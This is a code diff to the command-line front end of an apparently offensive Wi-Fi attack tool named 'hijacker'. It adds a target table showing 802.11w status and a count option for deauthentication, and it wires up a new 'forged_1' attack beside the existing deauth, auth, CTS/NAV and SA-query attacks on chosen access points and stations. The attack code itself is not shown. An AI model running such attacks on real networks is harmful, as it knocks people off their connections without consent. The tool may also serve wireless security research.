@@ -5,7 +5,7 @@ from argparse import ArgumentParser
 
 from termcolor import cprint
 
-from hijacker.attacks import auth_attack, sa_query_attack, cts_nav_attack
+from hijacker.attacks import auth_attack, sa_query_attack, cts_nav_attack, forged_1
 from hijacker.core import AP, Station
 from hijacker.interface import MonitorInterface
 from hijacker.threads import ScannerThread
@@ -15,22 +15,22 @@ MACCHANGER_BIN = '/usr/bin/macchanger'
 
 def get_aps(mon_interface):
     targets = {}
-    seen_essids = set()
     print("Hit Ctrl-C when ready to select a target")
+    print(" {: >3}  {: <32}  {: <17}  {: <4}  {: >8}".format("#", "ESSID", "BSSID", "SEC", "80211.w"))
+    print("-"*73)
     while True:
         try:
             target = mon_interface.get_new_target()
-            if not target.essid in seen_essids:
-                seen_essids.add(target.essid)
-                color, msg, n = None, None, None
-                if target.w:
-                    n = len(targets)
-                    targets[n] = target
-                    msg = '- 802.11w {} ({})'.format(target.w, n)
-                    color = 'on_magenta'
-                if target.essid:
-                    cprint("{} {}".format(target.essid, msg or ''),
-                           'white', color)
+            color, n = None, None
+            n = len(targets)
+            targets[n] = target
+            if target.w:
+                color = 'on_magenta'
+            if target.essid:
+                cprint("({: >3}) {: <32}  {}  {: <4}  {: >8}".format(n, target.essid,
+                                                                     target.bssid, target.encrypt,
+                                                                     target.w or 'no'),
+                       'white', color)
         except KeyboardInterrupt:
             print()
             return targets
@@ -63,6 +63,8 @@ def main():
     parser.add_argument('-c', '--channel', dest='channel', type=int, required=False, help='The target BSS channel.')
     parser.add_argument('-s', '--station', dest='station', required=False, help="The MAC address of a target station.")
     parser.add_argument('-a', '--attack', dest='attack', type=int, required=False, help="The attack to perform.")
+    parser.add_argument('-x', '--option', dest='option', required=False, help="An optional parameter to pass to the "
+                                                                              "attack.")
     args = parser.parse_args()
 
     mon_interface = MonitorInterface(args.mon_interface)
@@ -121,13 +123,16 @@ def main():
                 pass
 
         if attack == 1:
-            mon_interface.deauth(station.mac_addr, ap.bssid, 10)
+            count = int(args.option) if args.option else 10
+            mon_interface.deauth(station.mac_addr, ap.bssid, count)
         elif attack == 2:
             auth_attack(mon_interface, station, ap)
         elif attack == 3:
-            cts_nav_attack(mon_interface, station.mac_addr)
+            cts_nav_attack(mon_interface, station.mac_addr, ap)
         elif attack == 4:
             sa_query_attack(mon_interface, ap, station)
+        elif attack == 5:
+            forged_1(mon_interface, ap, station)
 
     except KeyboardInterrupt:
         print()
